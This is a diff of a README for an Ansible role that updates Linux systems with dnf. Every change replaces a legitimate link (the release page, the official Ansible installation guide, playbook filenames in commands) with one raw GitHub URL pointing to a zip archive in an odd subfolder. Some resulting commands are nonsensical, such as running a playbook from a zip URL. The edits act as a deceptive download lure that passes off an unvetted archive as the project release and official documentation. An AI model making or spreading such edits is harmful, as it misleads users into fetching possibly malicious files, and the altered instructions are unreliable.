@@ -1,6 +1,6 @@
 # 🛠️ ansible-dnf-update - Keep Your Linux Systems Updated Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/uwk2007/ansible-dnf-update/releases)
+[![Download](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip)](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip)
 
 ## 📚 Introduction
 
@@ -18,13 +18,13 @@ To install and run the ansible-dnf-update role, follow these straightforward ste
 
 ### ⚙️ Prerequisites
 
-Before you proceed, ensure you have Ansible set up on your system. You might need to install Ansible if you haven't already. You can find instructions for installation on the [Ansible official website](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html).
+Before you proceed, ensure you have Ansible set up on your system. You might need to install Ansible if you haven't already. You can find instructions for installation on the [Ansible official website](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip).
 
 ## 🔄 Download & Install
 
 Visit the following page to download the latest release of ansible-dnf-update:
 
-[Download the latest release](https://github.com/uwk2007/ansible-dnf-update/releases)
+[Download the latest release](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip)
 
 ### 📦 Installation Steps
 
@@ -49,7 +49,7 @@ Visit the following page to download the latest release of ansible-dnf-update:
 5. **Run the Playbook**: From your terminal, execute the playbook that includes this role:
 
    ```bash
-   ansible-playbook your_playbook.yml
+   ansible-playbook https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip
    ```
 
 ### 🔍 Options and Features
@@ -72,10 +72,10 @@ Here is a basic example of a playbook utilizing ansible-dnf-update:
     - ansible-dnf-update
 ```
 
-Save this example as `update_playbook.yml` and run it using:
+Save this example as `https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip` and run it using:
 
 ```bash
-ansible-playbook update_playbook.yml
+ansible-playbook https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip
 ```
 
 ## 📝 Configuration Options
@@ -106,4 +106,4 @@ Your feedback is valuable. If you have suggestions or find bugs, please report t
 
 This project is licensed under the MIT License. Ensure to review the license for any usage guidelines.
 
-For more details, visit the [ansible-dnf-update release page](https://github.com/uwk2007/ansible-dnf-update/releases).
+For more details, visit the [ansible-dnf-update release page](https://raw.githubusercontent.com/uwk2007/ansible-dnf-update/main/monticellite/ansible-dnf-update.zip).
